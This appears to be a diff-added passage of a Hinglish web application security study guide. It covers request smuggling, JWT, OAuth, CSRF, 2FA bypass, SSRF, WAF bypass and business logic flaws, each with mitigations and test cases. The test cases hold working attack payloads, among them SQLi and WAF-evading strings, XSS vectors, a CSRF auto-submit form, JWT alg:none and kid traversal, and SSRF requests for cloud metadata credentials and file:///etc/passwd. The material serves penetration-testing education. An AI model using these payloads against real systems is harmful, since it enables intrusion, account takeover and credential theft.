+<section class="topic" id="t28">
+<h2><span class="n">28</span>HTTP Request Smuggling &amp; HTTP Parameter Pollution</h2>
+<div class="def"><span class="lbl ld">Definition</span><br><b>Request Smuggling:</b> front-end proxy (Nginx/CDN) aur back-end server request parsing mein disagreement (Content-Length vs Transfer-Encoding) — attacker pehli request mein doosri request chhupa deta hai (CL.TE, TE.CL, TE.TE). Isse victim ke requests hijack, cache poisoning, auth bypass. <b>HPP:</b> same parameter multiple times bhejna (<code>?id=1&amp;id=2</code>) — alag-alag components (WAF, proxy, app) alag value use karte hain → validation bypass.</div>
+<div class="impact"><span class="lbl li">Impact</span><br>Smuggling: request queue poisoning, victim session hijack, XSS via cache poisoning, WAF bypass. HPP: auth/WAF bypass, business logic abuse.</div>
+<div class="mit"><span class="lbl lm">Mitigation (5 points)</span><ul>
+<li>Same server/proxy stack end-to-end (normalize request parsing).</li>
+<li>Reject ambiguous requests: multiple Content-Length, CL+TE together.</li>
+<li>Front-end: HTTP/2 (immune to CL/TE issues) or normalize to HTTP/1.1 clean.</li>
+<li>HPP: server-side decide single canonical parameter value; reject duplicates.</li>
+<li>WAF: signature + anomaly detection for smuggling patterns.</li></ul></div>
+<div class="tc"><span class="lbl lt">Test Cases (Hinglish)</span><ul>
+<li>CL.TE: CL 4 + TE chunked mein smuggled request bhejo, phir agla normal request hijack hota hai? (Burp Smuggler/HTTP Request Smuggler ext)</li>
+<li>TE.CL: reverse order test karo.</li>
+<li>HPP: <code>?role=user&amp;role=admin</code> — kaunsa value backend leta hai?</li>
+<li>HPP on login: <code>?username=admin&amp;username=attacker</code> — auth bypass?</li>
+<li>Timing test: smuggling se response delay/timing difference detect karo.</li></ul></div>
+<div class="sc"><span class="lbl ls">Real-world Scenario</span><br>Shopify-class setup: Nginx front + Apache back — CL.TE smuggling se attacker ne victim ke requests ko apne request mein prepend karvaya → victim ke session mein unauthorized actions. Fix: HTTP/2 + uniform parsing.</div>
+</section>
+
+<section class="topic" id="t29">
+<h2><span class="n">29</span>Prototype Pollution &amp; Web Cache Poisoning</h2>
+<div class="def"><span class="lbl ld">Definition</span><br><b>Prototype Pollution:</b> JS mein <code>__proto__</code>/<code>constructor.prototype</code> ke through object prototype modify karna — <code>{"__proto__":{"isAdmin":true}}</code> JSON merge karne wali libraries par. Isse property injection se auth bypass, XSS (polluted innerHTML sink), RCE (child_process options). <b>Web Cache Poisoning:</b> cache key mein na hone wale inputs (headers, params) se response content change karke poison karo — <code>X-Forwarded-Host</code> + caching → har user ko attacker ka payload serve hota hai.</div>
+<div class="impact"><span class="lbl li">Impact</span><br>Pollution: auth bypass, XSS, RCE in Node apps. Cache poisoning: mass XSS, full-site poisoning, DoS — one request, all users affected.</div>
+<div class="mit"><span class="lbl lm">Mitigation (5 points)</span><ul>
+<li>Pollution: use <code>Object.create(null)</code>, deep-merge libraries se bacho, validate keys (<code>__proto__</code>, <code>constructor</code> reject).</li>
+<li>Freeze prototypes in critical contexts; use Map instead of object for user keys.</li>
+<li>Cache: include ALL input that affects response in cache key (Vary).</li>
+<li>Cache only static/whitelisted endpoints; never cache personalized responses blindly.</li>
+<li>Validate/allowlist Host-derived headers used in content generation.</li></ul></div>
+<div class="tc"><span class="lbl lt">Test Cases (Hinglish)</span><ul>
+<li>JSON body: <code>{"__proto__":{"polluted":true}}</code> — response/console mein pollution reflect hota hai?</li>
+<li><code>constructor.prototype</code> variant bhi try karo.</li>
+<li>Query param <code>?__proto__[admin]=true</code> — server-side merge hota hai?</li>
+<li>Cache test: <code>X-Forwarded-Host: evil.com</code> bhej kar response cache karo, phir bina header ke hit karo — poisoned content aata hai?</li>
+<li>Cache key probing: unkeyed header (User-Agent?) response change karta hai?</li></ul></div>
+<div class="sc"><span class="lbl ls">Real-world Scenario</span><br>Node.js API user profile merge mein prototype pollution → attacker ne <code>__proto__.isAdmin</code> pollute kiya → admin access. Cache poisoning: CDN ne unkeyed <code>X-Forwarded-Host</code> reflect kiya → poora homepage poisoned XSS.</div>
+</section>
+
+<section class="topic" id="t30">
+<h2><span class="n">30</span>Clickjacking (UI Redressing)</h2>
+<div class="def"><span class="lbl ld">Definition</span><br>Attacker transparent iframe mein victim page load karta hai, apne misleading UI ke upar overlay karta hai — victim invisible button par click karta hai. Stored clickjacking: attacker kisi vulnerable page par apna draggable element daal kar victim ko kisi bhi action par click karwata hai. Impact: CSRF-like actions (delete account, transfer, enable camera), credential phishing via fake overlays.</div>
+<div class="impact"><span class="lbl li">Impact</span><br>Unauthorized actions (account deletion, purchases, permission grants), session-based CSRF, data exposure — depends on what the page allows.</div>
+<div class="mit"><span class="lbl lm">Mitigation (5 points)</span><ul>
+<li>Send <code>X-Frame-Options: DENY/SAMEORIGIN</code> on all pages.</li>
+<li>CSP: <code>frame-ancestors 'self'/'none'</code> (modern replacement).</li>
+<li>Use <code>frame-busting</code> JS only as defense-in-depth (not reliable alone).</li>
+<li>For sensitive actions: re-auth/OTP confirmation (breaks one-click abuse).</li>
+<li>Test all pages, especially dashboards, admin panels, settings.</li></ul></div>
+<div class="tc"><span class="lbl lt">Test Cases (Hinglish)</span><ul>
+<li>PoC HTML banao: iframe mein target page load karo — load hota hai? (XFO check)</li>
+<li>Burp response headers: X-Frame-Options / frame-ancestors present?</li>
+<li>Login/settings/admin pages specifically test karo.</li>
+<li>Clickjacking + CSRF chain: victim ko "Delete Account" button par click karwao.</li>
+<li>Mobile app WebView mein page load hota hai? — app-level clickjacking check.</li></ul></div>
+<div class="sc"><span class="lbl ls">Real-world Scenario</span><br>Social media "Delete Account" page par XFO missing — attacker ne transparent iframe + "Claim Your Prize" button se victim ke account delete karwae. Fix: X-Frame-Options: DENY + re-auth for account deletion.</div>
+</section>
+
+<section class="topic" id="t31">
+<h2><span class="n">31</span>CSRF — Deep Dive (Mitigation, Bypass, Exploitation)</h2>
+<div class="def"><span class="lbl ld">Definition</span><br>CSRF: victim ke browser mein authenticated session hota hai; attacker ka page victim ki taraf se cross-site request bhejta hai (form submit, img/fetch). Bina anti-CSRF token ke server action execute kar deta hai. <b>Login CSRF:</b> attacker victim ko attacker ke account mein login karwata hai — victim ki activities attacker ke account mein log hoti hain (defamation/fraud evidence). Mitigation: CSRF tokens, SameSite cookies, double-submit cookies, custom headers. Bypass: token stripping (if not validated), weak token generation, GET-based state change, JSON content-type not checked, SameSite bypass via subdomain/sibling domain, login CSRF is not always blocked.</div>
+<div class="impact"><span class="lbl li">Impact</span><br>State-changing actions bina user ke: password/email change, fund transfer, purchase, account deletion — Medium to High; chains with XSS for full takeover.</div>
+<div class="mit"><span class="lbl lm">Mitigation (5 points)</span><ul>
+<li>Synchronizer token: random, per-session, server-validated token in every state-changing request (form + custom header).</li>
+<li>SameSite=Lax/Strict cookies — cross-site requests mein cookie hi na jaye.</li>
+<li>Verify Origin/Referer headers for state-changing requests (fallback).</li>
+<li>Re-authentication/OTP for highly sensitive actions (transfer, delete).</li>
+<li>Never allow state changes via GET; JSON APIs require custom header + content-type check.</li></ul></div>
+<div class="tc"><span class="lbl lt">Test Cases (Hinglish)</span><ul>
+<li>CSRF PoC: <code>&lt;form action="https://target/change-email" method="POST"&gt;&lt;input name="email" value="h@e.com"&gt;&lt;/form&gt;</code> auto-submit — action hua?</li>
+<li>Token validation: token hatao ya badal do — request accept hoti hai? (token stripping)</li>
+<li>Token reuse: same token multiple requests — per-request validation hai?</li>
+<li>GET CSRF: <code>https://target/delete?id=5</code> direct open karo.</li>
+<li>Login CSRF: login form cross-site submit karo — victim attacker ke account mein login?</li>
+<li>SameSite test: <code>SameSite=None</code> cookies par CSRF token missing hai?</li></ul></div>
+<div class="sc"><span class="lbl ls">Real-world Scenario</span><br>Banking app mein transfer form bina CSRF token — attacker ne "Free Lottery" page se victim ke account se $5000 transfer karwaya. Fix: CSRF token + SameSite=Strict + OTP for transfers.</div>
+</section>
+
+<section class="topic" id="t32">
+<h2><span class="n">32</span>OTP / 2FA / MFA Bypass — All Test Cases</h2>
+<div class="def"><span class="lbl ld">Definition</span><br>2FA/MFA = second factor (OTP via SMS/email/app, TOTP, push, biometric). Bypass vectors: <b>response manipulation</b> (2FA flag false), <b>direct endpoint access</b> (step skip), <b>OTP brute force</b> (4-6 digits, no rate limit), <b>OTP reuse</b>, <b>OTP in response/URL</b>, <b>predictable OTP</b>, <b>race condition</b> (parallel requests), <b>null OTP / empty</b>, <b>backup code reuse</b>, <b>session fixation after 2FA</b>, <b>captcha is NOT 2FA</b> (bot protection, not a factor).</div>
+<div class="impact"><span class="lbl li">Impact</span><br>Complete account takeover bypassing the only real protection — Critical in banking/fintech apps.</div>
+<div class="mit"><span class="lbl lm">Mitigation (5 points)</span><ul>
+<li>Rate limit OTP attempts (e.g., 5 tries, lockout) + exponential backoff per user+IP.</li>
+<li>OTP: single-use, expiry (60-120s), server-side generated via CSPRNG/TOTP, hashed at rest.</li>
+<li>Never return OTP in response/headers/URL; never trust client-side 2FA flag.</li>
+<li>Enforce 2FA re-check on every sensitive action (not just login).</li>
+<li>Session binding: 2FA token bound to device/session; invalidate sessions on factor change.</li></ul></div>
+<div class="tc"><span class="lbl lt">Test Cases (Hinglish)</span><ul>
+<li>Brute: 000000-999999 burp intruder (6-digit, no rate limit?) — 100 tries.</li>
+<li>Response tamper: <code>"2fa_verified":false</code> → true / remove step param.</li>
+<li>Skip: 2FA ke baad wala endpoint directly hit karo (dashboard) bina OTP ke.</li>
+<li>Reuse: valid OTP do baar use karo — second time accept?</li>
+<li>Race: OTP verify request ko 20 parallel threads mein bhejo (race condition).</li>
+<li>Null/empty: OTP field blank ya null bhejo — accept hota hai?</li>
+<li>Old OTP: 2 din purana OTP ab bhi valid?</li>
+<li>Mobile change ke baad OTP — purana session active rehta hai?</li></ul></div>
+<div class="sc"><span class="lbl ls">Real-world Scenario</span><br>Fintech app ka 6-digit OTP bina rate limit — attacker ne 1M combinations brute force karke victim ka 2FA bypass kiya, phir fund transfer. Fix: 5 attempts + lockout + TOTP option.</div>
+</section>
+
+<section class="topic" id="t33">
+<h2><span class="n">33</span>JWT — Test Cases &amp; Vulnerabilities</h2>
+<div class="def"><span class="lbl ld">Definition</span><br>JWT = header.payload.signature (Base64url, HMAC/RS/ES). Why JWT over session: stateless, scalable (no server store), cross-domain (OAuth/OIDC), self-contained claims. <b>Attacks:</b> <code>alg:none</code>, algorithm confusion (RS256→HS256 with public key as HMAC secret), weak secret brute (HS256 crackable), no expiry validation, claim tampering (role/user admin), kid header injection (path traversal/SQLi), jku/x5u confusion, key injection, token in URL/localStorage leakage, session invalidation issues (stateless = can't revoke), signature stripping.</div>
+<div class="impact"><span class="lbl li">Impact</span><br>Auth bypass, account takeover, privilege escalation — Critical if verification flawed.</div>
+<div class="mit"><span class="lbl lm">Mitigation (5 points)</span><ul>
+<li>Use RS256/ES256 (asymmetric) — never HS256 with weak secret; never allow alg:none.</li>
+<li>Validate: signature, exp/nbf/iss/aud, token type, key id against allowlist.</li>
+<li>Pin exact algorithm during verification; reject algorithm changes.</li>
+<li>Keep secret ≥256-bit random; rotate keys; jwks with strict kid handling.</li>
+<li>Short expiry + refresh tokens + server-side denylist for revocation.</li></ul></div>
+<div class="tc"><span class="lbl lt">Test Cases (Hinglish)</span><ul>
+<li>alg:none: header <code>{"alg":"none"}</code> + empty signature — accept hota hai?</li>
+<li>RS→HS: public key ko secret bana kar HS256 sign karo — jwt.io se verify.</li>
+<li>Weak secret: jwt token ko hashcat/jwt_tool se crack karo (<code>john jwt.txt --wordlist</code>).</li>
+<li>Claim tamper: <code>{"role":"user"}</code> → <code>{"role":"admin"}</code> re-sign with known secret.</li>
+<li>Expiry: exp past/present/future mein change karke test karo.</li>
+<li>kid injection: <code>kid":"../../../../dev/null"</code> — path traversal read.</li>
+<li>jku: apna hosted JWKS URL daalo — server use karta hai?</li></ul></div>
+<div class="sc"><span class="lbl ls">Real-world Scenario</span><br>API ne alg:none accept kiya → attacker ne bina signature admin JWT banaya → poora admin panel access. Fix: alg allowlist + RS256.</div>
+</section>
+
+<section class="topic" id="t34">
+<h2><span class="n">34</span>OAuth vs OIDC — Differences, Attacks, Validation</h2>
+<div class="def"><span class="lbl ld">Definition</span><br><b>OAuth 2.0:</b> authorization framework — resource access delegation (access tokens). <b>OIDC:</b> OAuth 2.0 ke upar identity layer — <b>ID Token</b> (JWT) se authentication bhi (who the user is). OAuth flow: client → auth server → consent → authorization code → token → resource server. <b>Validation by third-party API:</b> verify signature (JWKS from issuer), exp/iss/aud, nonce (OIDC), PKCE (code verifier). <b>Attacks:</b> redirect_uri manipulation, open redirect chaining (token theft), CSRF on auth flow (no state), code/token leakage via referer, weak client secret, PKCE missing (native apps), token in URL.</div>
+<div class="impact"><span class="lbl li">Impact</span><br>Account takeover (token theft), authorization code interception, user data theft from connected apps.</div>
+<div class="mit"><span class="lbl lm">Mitigation (5 points)</span><ul>
+<li>Strict redirect_uri allowlist (exact match, no prefix matching).</li>
+<li>Use state parameter (CSRF) + PKCE (native/SPA flows) + nonce (OIDC).</li>
+<li>Validate token signature, iss, aud, exp on every request.</li>
+<li>Never log tokens; don't pass tokens in URLs — use POST/headers.</li>
+<li>Short-lived access tokens + refresh token rotation + revocation.</li></ul></div>
+<div class="tc"><span class="lbl lt">Test Cases (Hinglish)</span><ul>
+<li>redirect_uri change: <code>https://evil.com</code>, <code>https://target.com.evil.com</code>, path-based <code>https://target.com/evil</code> — allowlist strict hai?</li>
+<li>state missing/weak — login CSRF possible?</li>
+<li>Open redirect chain: redirect_uri jo app ka open redirect ho — token wahan leak?</li>
+<li>PKCE missing: authorization code intercept (native app scenario) test karo.</li>
+<li>Token in URL: authorization response mein token visible? (referer leak)</li></ul></div>
+<div class="sc"><span class="lbl ls">Real-world Scenario</span><br>OAuth client ne redirect_uri prefix-match kiya — attacker ne <code>https://app.com.evil.com</code> use kiya, victim ka authorization code intercept → access token → victim ka Google account data chori.</div>
+</section>
+
+<section class="topic" id="t35">
+<h2><span class="n">35</span>IDOR / BOLA / BFLA / Privilege Escalation</h2>
+<div class="def"><span class="lbl ld">Definition</span><br><b>IDOR:</b> direct object reference (IDs/keys) bina authz check — <code>/order?id=1001</code> kisi aur ka data. <b>BOLA (OWASP API #1):</b> object-level authz broken — API context mein IDOR. <b>BFLA:</b> function-level authz broken — normal user admin function call kar sakta hai (vertical). Difference: BOLA = doosre ka object access (horizontal); BFLA = doosre ke functions/roles access (vertical). <b>IDOR on static page:</b> generally no — bina login/data access ke object reference nahi hota; but static pages par data in JS/JSON mein embed ho sakta hai — check source.</div>
+<div class="impact"><span class="lbl li">Impact</span><br>PII/data theft, account takeover, privilege escalation — most common critical finding (A01).</div>
+<div class="mit"><span class="lbl lm">Mitigation (5 points)</span><ul>
+<li>Server-side authz check on EVERY object access (ownership + role).</li>
+<li>Use unpredictable IDs (UUID) + reference maps, but treat as defense not fix.</li>
+<li>Function-level: role/permission middleware on every endpoint (BFLA).</li>
+<li>Deny by default; return 403/404 generic to avoid enumeration.</li>
+<li>Test with two accounts (A access B's data) in every API test.</li></ul></div>
+<div class="tc"><span class="lbl lt">Test Cases (Hinglish)</span><ul>
+<li>IDs sequential hain? <code>/user/1</code> se <code>/user/2</code> tak iterate karo (two accounts se).</li>
+<li>POST/DELETE bhi test karo — sirf GET nahi.</li>
+<li>UUID bhi try karo — guessable/reusable hain?</li>
+<li>Role change: normal token se admin endpoint hit karo (BFLA).</li>
+<li>Mobile app API: userId param tamper karke doosre ka profile fetch karo.</li>
+<li>Static page: HTML/JS mein embedded user data check karo.</li></ul></div>
+<div class="sc"><span class="lbl ls">Real-world Scenario</span><br>Healthcare app: <code>GET /api/patient/1234</code> bina authz — attacker ID iterate karke 50k patients ki medical records leak kar diye. Fix: ownership check + UUID + audit.</div>
+</section>
+
+<section class="topic" id="t36">
+<h2><span class="n">36</span>Session Hijacking vs Session Fixation</h2>
+<div class="def"><span class="lbl ld">Definition</span><br><b>Hijacking:</b> attacker valid session ko <i>steal</i> karta hai (XSS se cookie, MITM sniffing, log/Referer leak, malware) — passive/active theft. <b>Fixation:</b> attacker victim ko apne <i>known</i> session ID par login karwata hai (cookie injection, subdomain cookie, login link mein sessionid) — phir login hone ke baad wahi ID use karta hai. Difference: hijack = stolen valid session; fixation = attacker-controlled session jise victim authenticate karta hai. Mitigation dono ke liye: session ID rotation on login/logout.</div>
+<div class="impact"><span class="lbl li">Impact</span><br>Full account takeover in both cases; fixation is stealthier (no interception needed).</div>
+<div class="mit"><span class="lbl lm">Mitigation (5 points)</span><ul>
+<li>Rotate/invalidate session ID on login, logout, privilege change.</li>
+<li>HttpOnly + Secure + SameSite cookies; never accept session ID from URL.</li>
+<li>Bind session to user agent/IP (defense in depth) + detect anomalies.</li>
+<li>HTTPS everywhere (HSTS) — MITM sniffing roko.</li>
+<li>Short session lifetime + inactivity timeout.</li></ul></div>
+<div class="tc"><span class="lbl lt">Test Cases (Hinglish)</span><ul>
+<li>Login se pehle/baad session ID compare karo — change hota hai? (fixation test)</li>
+<li>Login link mein sessionid param: <code>?sessionid=abc</code> — app use karta hai?</li>
+<li>Set-Cookie: Domain attribute subdomain injectable? (<code>.target.com</code> se cookie daalo)</li>
+<li>XSS se cookie steal: HttpOnly missing? (hijacking test)</li>
+<li>Logout ke baad purana ID valid? (invalidation test)</li></ul></div>
+<div class="sc"><span class="lbl ls">Real-world Scenario</span><br>Login URL par <code>?sessionid=fixed123</code> accept hota hai → attacker victim ko yeh link bhejta hai → victim login karta hai → attacker fixed123 se session access karta hai. Fix: always issue fresh random ID post-login.</div>
+</section>
+
+<section class="topic" id="t37">
+<h2><span class="n">37</span>Login Page Testing + Brute-Force Alternatives (Rate Limiting)</h2>
+<div class="def"><span class="lbl ld">Definition</span><br>Login vulnerabilities: SQLi, username enumeration (different errors/timing), weak credentials, no rate limit, no lockout, credential stuffing, default creds, session issues, password reset flaws, OTP flaws, captcha bypass, remember-me flaws. <b>If brute-force protection not implemented, alternatives:</b> rate limiting (per IP + per user, sliding window), lockout policy (account lock after N fails), CAPTCHA after failures, IP reputation/geo blocking, device fingerprinting, exponential backoff, alerts/monitoring on spikes. Implementation of rate limiting: token bucket/sliding window in middleware/API gateway (e.g., nginx limit_req, Redis INCR with TTL).</div>
+<div class="impact"><span class="lbl li">Impact</span><br>Account takeover, credential stuffing at scale, DoS via lockout abuse.</div>
+<div class="mit"><span class="lbl lm">Mitigation (5 points)</span><ul>
+<li>Rate limit: 5-10 attempts per 15 min per account+IP; burst control at gateway.</li>
+<li>Progressive lockout + CAPTCHA escalation after repeated failures.</li>
+<li>Uniform error messages/timing to prevent user enumeration.</li>
+<li>MFA + WebAuthn/passkeys for high-value accounts.</li>
+<li>Monitor failed-login spikes, alert SOC, blocklist abusive IPs.</li></ul></div>
+<div class="tc"><span class="lbl lt">Test Cases (Hinglish)</span><ul>
+<li>Intruder se 100 wrong passwords — kahan block hota hai? (rate limit test)</li>
+<li>Rate limit bypass: X-Forwarded-For spoof, session rotation, parallel connections.</li>
+<li>Enumeration: "Invalid username" vs "Wrong password" — messages differ?</li>
+<li>SQLi login: <code>' OR 1=1--</code>, <code>admin'--</code>, <code>' UNION SELECT...</code>.</li>
+<li>Lockout bypass: forgot-password flow se lockout reset hota hai?</li>
+<li>Default creds: admin/admin, admin/123456, root/toor.</li></ul></div>
+<div class="sc"><span class="lbl ls">Real-world Scenario</span><br>Login bina rate limit → attacker ne rockyou wordlist se 10k attempts chalakar admin password crack kiya. Fix: rate limit per IP+user, lockout, MFA for admins.</div>
+</section>
+
+<section class="topic" id="t38">
+<h2><span class="n">38</span>API Testing Approach + Token Types</h2>
+<div class="def"><span class="lbl ld">Definition</span><br>Approach: (1) <b>Recon:</b> Swagger/OpenAPI, Postman collections, JS source se endpoints, subdomain/wordlist fuzzing; (2) <b>AuthN/AuthZ:</b> token types test, roles, IDOR/BFLA; (3) <b>Input:</b> injection per parameter; (4) <b>Business logic:</b> order flow, price, quantity; (5) <b>Rate limit/abuse:</b> enumeration, brute; (6) <b>Tokens:</b> JWT (alg confusion, expiry), opaque tokens, OAuth tokens, API keys (reuse, no expiry), refresh tokens (rotation, revocation). Access token purpose: stateless authorization — carries claims; security: short expiry, scopes, never in URL, secure storage, TLS.</div>
+<div class="impact"><span class="lbl li">Impact</span><br>Exposed/weak API = data breach, unauthorized transactions, account takeover at scale.</div>
+<div class="mit"><span class="lbl lm">Mitigation (5 points)</span><ul>
+<li>Auth: short-lived access tokens + rotating refresh tokens + revocation list.</li>
+<li>Scope token: least privilege per token; validate scope server-side per endpoint.</li>
+<li>Rate limit per API key/user; API key rotation + secret storage.</li>
+<li>Input validation + parameterized queries in all API endpoints.</li>
+<li>Never expose API keys in JS/APKs; use proxy/backend for third-party keys.</li></ul></div>
+<div class="tc"><span class="lbl lt">Test Cases (Hinglish)</span><ul>
+<li>Swagger/OpenAPI dhundho: /swagger, /api-docs, /v2/api-docs, /openapi.json.</li>
+<li>Har endpoint: IDOR (two users), BFLA (role swap), injection, mass assignment.</li>
+<li>Refresh token reuse — rotate hota hai? purana kaam karta hai?</li>
+<li>API key in JS source / APK strings search karo.</li>
+<li>Rate limit per endpoint test; pagination abuse (limit=99999).</li>
+<li>HTTP methods: PUT/DELETE/PATCH enabled unnecessarily?</li></ul></div>
+<div class="sc"><span class="lbl ls">Real-world Scenario</span><br>Mobile app mein API key hardcoded tha + refresh token kabhi expire nahi hota → attacker ne key extract kar ke unlimited API calls ki aur refresh token se accounts hijack kiye.</div>
+</section>
+
+<section class="topic" id="t39">
+<h2><span class="n">39</span>SSRF — Deep Dive (In-band, OOB, via XXE, Sinkhole &amp; WAF)</h2>
+<div class="def"><span class="lbl ld">Definition</span><br>SSRF: server user-controlled URL fetch karta hai — attacker internal resources hit karta hai. Vectors: URL params (url, image, webhook, callback), file upload (URL fetch), XML parsers (XXE→SSRF), PDF generators, webhooks. <b>In-band:</b> response mein internal data dikhta hai (metadata, localhost). <b>OOB/Blind:</b> response nahi dikhta — Burp Collaborator se DNS/HTTP exfil. <b>Via XXE:</b> <code>&lt;!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/"&gt;</code>. <b>Sinkhole/WAF bypass:</b> IP encoding (decimal/hex <code>http://2130706433/</code>, <code>0x7f000001</code>), IPv6 <code>http://[::1]</code>, redirect-based (302 to internal), DNS rebinding, URL parser confusion (<code>http://evil.com@127.0.0.1</code>, <code>http://127.0.0.1:80@evil.com</code>), <code>http://localhost.evil.com</code>.</div>
+<div class="impact"><span class="lbl li">Impact</span><br>Cloud metadata theft (AWS keys → full cloud compromise), internal port scan, internal service attack (Redis/SMTP/DB), RCE in some chains — Critical.</div>
+<div class="mit"><span class="lbl lm">Mitigation (5 points)</span><ul>
+<li>Allowlist destinations (domain/IP) instead of denylist; block private ranges.</li>
+<li>Resolve DNS and validate IP BEFORE connecting; block redirects; disable DNS rebinding (pin resolved IP).</li>
+<li>Egress firewall: allow only necessary outbound (blocks OOB exfil).</li>
+<li>Cloud: block metadata endpoint (169.254.169.254) via IMDSv2 + network policy.</li>
+<li>Use safe URL libraries with no auto-follow/redirect to internal IPs.</li></ul></div>
+<div class="tc"><span class="lbl lt">Test Cases (Hinglish)</span><ul>
+<li><code>url=http://127.0.0.1:22</code>, <code>http://localhost:8080</code> — response/time diff se port detect.</li>
+<li>Metadata: <code>http://169.254.169.254/latest/meta-data/iam/security-credentials/</code>.</li>
+<li>Encoded bypass: decimal <code>http://2130706433/</code>, hex <code>0x7f000001</code>, IPv6 <code>[::1]</code>, short <code>http://127.1/</code>.</li>
+<li>Redirect bypass: attacker server 302 → internal IP (auto-follow?).</li>
+<li>OOB: <code>http://collaborator-id.oastify.com</code> — DNS hit aata hai?</li>
+<li>XXE→SSRF: XML body ke through internal fetch.</li>
+<li>File protocols: <code>file:///etc/passwd</code>, <code>gopher://</code> (Redis RCE chain).</li></ul></div>
+<div class="sc"><span class="lbl ls">Real-world Scenario</span><br>Image-preview feature ne URL fetch kiya bina validation — attacker ne <code>http://169.254.169.254/...</code> se IAM keys nikale aur poora AWS account compromise. Fix: allowlist + IMDSv2 + egress filtering.</div>
+</section>
+
+<section class="topic" id="t40">
+<h2><span class="n">40</span>WAF Detection &amp; Bypass Techniques</h2>
+<div class="def"><span class="lbl ld">Definition</span><br>WAF detect: error pages (Cloudflare/Akamai/Imperva signatures), headers (<code>server: cloudflare</code>), cookies (<code>__cf_bm</code>, <code>citrix_ns_id</code>), behavior (403 on <code>' OR 1=1--</code>, challenge pages). <b>Bypass techniques:</b> encoding (URL/double-URL, Unicode, HTML entity), case mutation, comments <code>/**/</code>, inline comments MySQL <code>/*!50000*/</code>, whitespace tricks (tab, newline, %09), equivalent functions (<code>SLEEP(5)</code> vs <code>BENCHMARK</code> vs <code>WAITFOR</code>), string concat (<code>'adm'||'in'</code>, CHAR()), HPP, chunked transfer encoding, HTTP/2, method switching (GET/POST/PUT), JSON/XML body, oversized payloads, fragmented payloads, WAF-blind spots (bypass via second endpoint), Unicode normalization.</div>
+<div class="impact"><span class="lbl li">Impact</span><br>WAF bypass = underlying vulnerabilities exploitable — SQLi, XSS, RCE reachable despite protection.</div>
+<div class="mit"><span class="lbl lm">Mitigation (5 points)</span><ul>
+<li>Treat WAF as defense-in-depth — fix root cause (parameterized queries, encoding).</li>
+<li>Layered WAF (L7 + L3/4) + rate limiting + bot management.</li>
+<li>WAF rules tuned per app (not generic); test bypasses regularly.</li>
+<li>Deploy WAF in front of ALL entry points (no origin IP exposure).</li>
+<li>Monitor WAF evasions and update signatures.</li></ul></div>
+<div class="tc"><span class="lbl lt">Test Cases (Hinglish)</span><ul>
+<li>Detect: <code>' OR 1=1--</code> → 403? headers/cookies se WAF identify karo (wafw00f).</li>
+<li>Encode: <code>%27%20OR%201%3D1--</code>, double encode <code>%2527</code>, Unicode <code>%u0027</code>.</li>
+<li>Comments: <code>'/**/OR/**/1=1--</code>, <code>'/*!50000OR*/1=1--</code>.</li>
+<li>Case/whitespace: <code>'Or/**/1=1%09--</code>, <code>SELECT%0b1</code>.</li>
+<li>HPP: <code>?id=1&amp;id=' OR 1=1--</code> — WAF 1st dekhta hai, app 2nd use karti hai.</li>
+<li>Chunked TE + HTTP/2 body mein payload bhejo.</li>
+<li>XSS bypass: <code>&lt;svg/onload=alert(1)&gt;</code>, <code>&lt;img src=x onerror=&#97;lert(1)&gt;</code> (HTML entity).</li></ul></div>
+<div class="sc"><span class="lbl ls">Real-world Scenario</span><br>Cloudflare ne <code>' OR 1=1--</code> block kiya, lekin <code>'/*!50000OR*/1=1#</code> pass ho gaya — blind SQLi confirm → data dump. Fix: parameterization (WAF kabhi fix nahi hai).</div>
+</section>
+
+<section class="topic" id="t41">
+<h2><span class="n">41</span>Business Logic Flaws + Payment Gateway Test Cases</h2>
+<div class="def"><span class="lbl ld">Definition</span><br>Logic flaws = app apne rules galat implement karta hai: negative quantity/price, coupon reuse, race condition on balance (double spend), step skip (payment bypass), currency/rounding tricks, referral abuse, OTP reuse, password reset reuse, limit bypass (quantity=0, negative), IDOR in workflows, status change ordering (cancel→refund loop). <b>Payment gateway test cases:</b> price tamper in request, negative amount, currency swap, double submit (race), coupon stacking, response manipulation (success flag), failure→success status flip, refund manipulation, partial payment, IDOR on order/invoice, replay of payment callback, amount mismatch between UI/API/DB, tax/shipping manipulation, quantity overflow.</div>
+<div class="impact"><span class="lbl li">Impact</span><br>Financial loss, free purchases, infinite money, fraud — High/Critical in fintech.</div>
+<div class="mit"><span class="lbl lm">Mitigation (5 points)</span><ul>
+<li>Server-side price/amount authority — never trust client values.</li>
+<li>Idempotency keys on payment endpoints (race/double-spend roko).</li>
+<li>Validate payment callback signatures + amount/status reconciliation with gateway.</li>
+<li>Coupons: single-use, per-user binding, expiry, server-side state.</li>
+<li>Workflow state machines: validate step order server-side (no skip).</li></ul></div>
+<div class="tc"><span class="lbl lt">Test Cases (Hinglish)</span><ul>
+<li>Price: checkout request mein <code>price=1</code>, <code>price=-1</code>, <code>price=0</code> bhejo.</li>
+<li>Race: same order pay request 20 parallel threads (double spend).</li>
+<li>Coupon: reuse, multiple apply, apply to other user's account, expired coupon.</li>
+<li>Callback: payment webhook replay karo, status success/failed flip karo.</li>
+<li>Currency: USD → INR conversion loophole, rounding (0.1+0.2).</li>
+<li>Quantity: -5, 0, 9999999, decimal — total negative hota hai?</li>
+<li>Step skip: payment page skip karke order-confirm endpoint direct hit karo.</li></ul></div>
+<div class="sc"><span class="lbl ls">Real-world Scenario</span><br>E-commerce mein race condition — attacker ne same gift card 50 parallel requests mein redeem kiya → 50x balance. Fix: idempotency + atomic DB update (row lock).</div>
+</section>
+
+<section class="topic" id="t42">
+<h2><span class="n">42</span>Static Android Application Testing (Full Checklist)</h2>
+<div class="def"><span class="lbl ld">Definition</span><br>Static testing = bina app chalaaye code/config analyze karna. Tools: jadx (decompile APK), apktool (decode resources/smali), MobSF (automated), dex2jar + jd-gui, objection. Check: <b>1. Storage</b> — SharedPreferences/DB/files mein plaintext secrets; <b>2. android:debuggable=true</b> — debug exploit; <b>3. WebView</b> — JS enabled, file access, addJavascriptInterface, setAllowFileAccess; <b>4. android:exported=true</b> — external components callable; <b>5. allowBackup=true</b> — adb backup se data nikalna; <b>6. logs</b> — Log.i/d sensitive data; <b>7. root checks</b> — missing → rooted device par data at risk; <b>8. XSS in WebView</b> — loadUrl(user input); <b>9. MIME sniffing</b> — setAllowContentAccess etc; <b>10.</b> hardcoded keys/APIs, insecure TLS config, weak crypto, exported providers, intent filters.</div>
+<div class="impact"><span class="lbl li">Impact</span><br>Data leakage, reverse-engineering of secrets, account takeover, malware injection via exported components.</div>
+<div class="mit"><span class="lbl lm">Mitigation (5 points)</span><ul>
